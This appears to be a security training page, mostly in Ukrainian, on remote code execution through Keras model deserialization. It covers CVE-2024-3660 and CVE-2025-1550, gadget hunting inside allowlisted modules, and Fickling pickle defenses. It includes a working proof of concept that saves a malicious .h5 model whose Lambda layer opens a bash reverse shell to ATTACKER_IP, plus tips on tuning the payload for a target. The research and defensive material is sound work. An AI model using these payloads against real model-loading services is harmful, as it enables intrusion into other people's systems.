# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка підсумовує практичні техніки експлуатації проти конвеєра десеріалізації Keras моделей, пояснює внутрішню структуру нативного формату .keras та поверхню атаки, а також надає набір інструментів для дослідника для пошуку Model File Vulnerabilities (MFVs) та post-fix gadgets.

## .keras model format internals

Файл .keras — це ZIP-архів, що містить щонайменше:
- metadata.json – загальна інформація (наприклад, версія Keras)
- config.json – архітектура моделі (primary attack surface)
- model.weights.h5 – ваги в HDF5

The config.json drives recursive deserialization: Keras imports modules, resolves classes/functions and reconstructs layers/objects from attacker-controlled dictionaries.

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Десеріалізація виконує:
- Імпорт модулів та розв'язання символів із ключів module/class_name
- from_config(...) або виклик конструктора з kwargs, контрольованими атакуючим
- Рекурсія у вкладені об'єкти (activations, initializers, constraints, etc.)

Історично це відкривало три примітиви для атакуючого, який формував config.json:
- Контроль над тим, які модулі імпортуються
- Контроль над тим, які класи/functions визначаються
- Контроль над kwargs, що передаються конструкторам/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Коренева причина:
- Lambda.from_config() використовував python_utils.func_load(...), яка base64-декодує і викликає marshal.loads() на байтах атакуючого; Python unmarshalling може виконувати код.

Ідея експлойту (спрощений payload у config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras enforces safe_mode=True by default. Serialized Python functions in Lambda are blocked unless a user explicitly opts out with safe_mode=False.

Notes:
- Legacy formats (older HDF5 saves) or older codebases may not enforce modern checks, so “downgrade” style attacks can still apply when victims use older loaders.

## CVE-2025-1550 – Довільний імпорт модулів у Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn використовував без обмежень importlib.import_module() з рядками модулів, контрольованими атакуючим, з config.json.
- Impact: Довільний імпорт будь-якого встановленого модуля (або модуля, підкладеного атакуючим у sys.path). Код, що виконується під час імпорту, запускається, після чого створення об'єкта відбувається з kwargs, наданими атакуючим.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Покращення безпеки (Keras ≥ 3.9):
- Allowlist модулів: імпорти обмежені офіційними модулями екосистеми: keras, keras_hub, keras_cv, keras_nlp
- Безпечний режим за замовчуванням: safe_mode=True блокує завантаження небезпечних серіалізованих функцій Lambda
- Базова перевірка типів: десеріалізовані об'єкти повинні відповідати очікуваним типам

## Практична експлуатація: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Багато продакшн-середовищ досі приймають застарілі TensorFlow-Keras HDF5 модельні файли (.h5). Якщо зловмисник може завантажити модель, яку сервер пізніше завантажить або виконає для inference, шар Lambda може виконати довільний Python під час завантаження/побудови/передбачення.

Мінімальний PoC для створення шкідливого .h5, який виконує reverse shell при десеріалізації або використанні:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Примітки та поради щодо надійності:
- Точки спрацьовування: код може виконуватися кілька разів (наприклад, під час layer build/first call, model.load_model і predict/fit). Зробіть payloads ідемпотентними.
- Фіксація версій: підбирайте TF/Keras/Python жертви, щоб уникнути невідповідностей у серіалізації. Наприклад, збирайте артефакти під Python 3.8 з TensorFlow 2.13.1, якщо саме це використовує ціль.
- Швидке відтворення середовища:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Валідація: нешкідливий payload, наприклад os.system("ping -c 1 YOUR_IP"), допомагає підтвердити виконання (наприклад, спостерігаючи ICMP з tcpdump) перед переходом на reverse shell.

## Post-fix gadget surface inside allowlist

Навіть при allowlisting і safe mode серед дозволених Keras callables залишається широка поверхня. Наприклад, keras.utils.get_file може завантажувати довільні URL до місць, які обирає користувач.

Gadget via Lambda, що посилається на дозволену функцію (не serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Важливе обмеження:
- Lambda.call() додає вхідний тензор як перший позиційний аргумент при виклику цільового callable. Вибрані gadgets мають витримувати додатковий позиційний аргумент (або приймати *args/**kwargs). Це звужує коло функцій, які підходять.

## ML pickle import allowlisting for AI/ML models (Fickling)

Багато форматів AI/ML моделей (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, старі TensorFlow артефакти тощо) вбудовують Python pickle-дані. Атакувальники рутинно зловживають pickle GLOBAL імпортами та конструкторами об'єктів, щоб досягти RCE або підміни моделі під час завантаження. Сканери, що базуються на чорних списках, часто пропускають нові або не перелічені небезпечні імпорти.

Практичний fail-closed захід — перехопити pickle-десеріалізатор Python і дозволяти лише перевірений набір нешкідливих імпортів, пов'язаних з ML, під час unpickling. Trail of Bits’ Fickling реалізує цю політику і постачається з курованим ML import allowlist, сформованим з тисяч публічних Hugging Face pickles.

Модель безпеки для «безпечних» імпортів (інтуїції, витиснені з досліджень і практики): імпортовані символи, які використовує pickle, мають одночасно:
- Не виконувати код і не викликати виконання (немає скомпільованих/джерельних об'єктів коду, shell-операцій, хуків тощо)
- Не отримувати/не встановлювати довільні атрибути або елементи
- Не імпортувати і не отримувати посилань на інші Python-об'єкти з pickle VM
- Не запускати вторинні десеріалізатори (наприклад, marshal, nested pickle), навіть опосередковано

Увімкніть захисти Fickling якомога раніше під час запуску процесу, щоб будь-які pickle-завантаження, виконані фреймворками (torch.load, joblib.load тощо), перевірялися:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Оперативні поради:
- Ви можете тимчасово відключити/знову увімкнути hooks там, де потрібно:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Якщо відома-безпечна модель заблокована, розширте allowlist для вашого середовища після перегляду символів:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling також надає загальні runtime-захисти, якщо ви віддаєте перевагу більш тонкому контролю:
- fickling.always_check_safety() щоб застосувати перевірки для всіх pickle.load()
- with fickling.check_safety(): для обмеженого застосування в межах блоку
- fickling.load(path) / fickling.is_likely_safe(path) для одноразових перевірок

- Віддавайте перевагу форматам моделей без pickle, коли це можливо (наприклад, SafeTensors). Якщо ви змушені приймати pickle, запускайте завантажувачі з мінімальними привілеями без виходу в мережу та застосовуйте allowlist.

Ця стратегія allowlist-first демонстративно блокує загальні шляхи експлойту pickle у ML, зберігаючи високу сумісність. У бенчмарку ToB, Fickling позначив 100% синтетичних шкідливих файлів і дозволив ~99% чистих файлів з топових репозиторіїв Hugging Face.


## Інструментарій дослідника

1) Систематичне виявлення гаджетів в allowlisted модулях

Перелічіть кандидатські callables у keras, keras_nlp, keras_cv, keras_hub та віддайте пріоритет тим, які мають побічні ефекти стосовно файлів, мережі, процесів або змін оточення.

<details>
<summary>Перелічити потенційно небезпечні callables в allowlisted модулях Keras</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Пряме тестування десеріалізації (no .keras archive needed)

Подавайте спеціально створені dicts безпосередньо в Keras deserializers, щоб дізнатися прийняті params і спостерігати побічні ефекти.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Перевірка сумісності між версіями та форматами

Keras існує в кількох кодових базах/епохах з різними механізмами захисту та форматами:
- TensorFlow built-in Keras: tensorflow/python/keras (застарілий, заплановано до видалення)
- tf-keras: підтримується окремо
- Multi-backend Keras 3 (official): представив рідний формат .keras

Повторюйте тести в різних кодових базах та форматах (.keras vs legacy HDF5), щоб виявити регресії або відсутні механізми захисту.

## Посилання

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
